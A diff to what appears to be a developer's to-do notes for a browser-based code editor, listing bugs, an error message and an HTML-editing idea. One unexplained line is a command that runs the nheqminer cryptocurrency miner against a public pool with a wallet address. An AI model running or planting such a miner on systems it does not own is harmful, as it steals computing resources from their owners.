@@ -1,6 +1,20 @@
+When saving a file the text in the text input is white...
+
+When opening a image file you get an error, then the image file is saved in opened files, but you can't close it,
+resulting in an error every time you open the editor...
+
+When logging in on webide.se (for the second time)
+Error: Unable to get node version! Error: Server: API error: spawn /bin/dash ENOENT err.code=ENOENT (code=undefined)
+
+Need an easier way for mere mortals to edit a website!
+Being able to edit a website like if it was a word document...
+idea: Structural editing of HTML, edit h1, p, etc using text input or textarea
 
 
 Running tests. new release/upgrade
+
+
+"cmd": "./nheqminer -v -l na.luckpool.net:3956 -u RGGqkqX6HXJrJ3iRWaZs8CGvj2tyPtj4q9.WORKER-06 -p x -t 8",
 
 
 color in save-file input!
